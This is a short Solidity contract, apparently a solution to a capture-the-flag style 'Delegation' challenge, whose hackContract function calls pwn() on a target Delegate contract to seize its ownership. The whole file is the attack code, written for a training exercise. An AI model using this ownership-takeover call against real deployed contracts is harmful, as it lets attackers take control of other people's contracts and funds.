// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";


contract AttackingDelegation {
    address public contractAddress;
    Delegate delegate;
    string functionName;
    constructor(address _contractAddress) {
    delegate = Delegate(_contractAddress);
    functionName = "pwn()";
    }

    function hackContract() external {
    (bool result,) = address(delegate).call(abi.encodeWithSignature("pwn()"));
    require(result);
    }
}
